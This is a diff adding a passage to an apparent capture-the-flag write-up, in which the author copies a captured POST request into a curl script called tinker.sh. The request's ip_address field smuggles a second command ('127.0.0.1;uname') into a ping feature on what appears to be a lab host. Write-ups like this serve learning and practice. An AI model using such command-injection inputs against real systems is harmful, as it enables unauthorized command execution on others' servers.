@@ -97,3 +97,12 @@ and Bingo! was able to get it to work marginally faster and also now know the ke
 
 ### Making a bash script
 
+Taking a look at the post request that was sent to the server to perform the ping command, I can copy this as a curl request to begin building a bash script for myself. I will call this initial script tinker.sh.
+
+```bash
+#!/bin/bash
+
+curl 'http://178.128.163.152:32305/' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://178.128.163.152:32305/' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://178.128.163.152:32305' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' --data-raw 'test=ping&ip_address=127.0.0.1%3Buname&submit=Test'
+
+```
+
